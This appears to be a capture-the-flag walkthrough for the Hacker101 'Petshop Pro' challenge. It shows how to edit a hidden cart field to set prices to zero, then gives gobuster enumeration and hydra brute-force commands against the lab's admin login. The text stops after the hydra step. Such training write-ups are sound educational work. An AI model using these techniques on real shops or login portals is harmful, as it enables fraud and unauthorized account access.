## Petshop Pro

This is an easy challenge

### Steps to repeoduce

1. Start the challenge
2. You should see a shop that contains 2 pets, a kitten and a puppy

### Flag 1

1. Add 2 items into the cart
2. While on the cart page, right click on the page and open `Inspect Elements`
3. While going through the code, you will notice a hidden part in the code with all items in the cart. The code looks like this
```

			<input type="hidden" name="cart" value="[[0, {&quot;logo&quot;: &quot;kitten.jpg&quot;, &quot;price&quot;: 8.95, &quot;name&quot;: &quot;Kitten&quot;, &quot;desc&quot;: &quot;8\&quot;x10\&quot; color glossy photograph of a kitten.&quot;}], [1, {&quot;logo&quot;: &quot;puppy.jpg&quot;, &quot;price&quot;: 7.95, &quot;name&quot;: &quot;Puppy&quot;, &quot;desc&quot;: &quot;8\&quot;x10\&quot; color glossy photograph of a puppy.&quot;}]]">
			<p><input type="submit" value="Check Out"></p>
```
4. Remove the `type="hidden"` part of the code and you will see an editable box show up on the page
5. From this input box, you can change the prices to any other number or zero and hit `checkout`
6. Your flag will be shown.

### Flag 2

1. Using gobuster, enumerate the directories on the pet shop domain
```
gobuster dir -u https://e87aacde34c038c97082f0f94069e1e4.ctf.hacker101.com/ -w /usr/share/wordlists/dirb/common.txt
```
2. You will discover a login page to an admin portal
3. Using hydra, we will bruteforce both the username and password for the login page

```
hydra -L /usr/share/wordlists/rockyou.txt -p "pass" e87aacde34c038c97082f0f94069e1e4.ctf.hacker101.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -t 32
```

```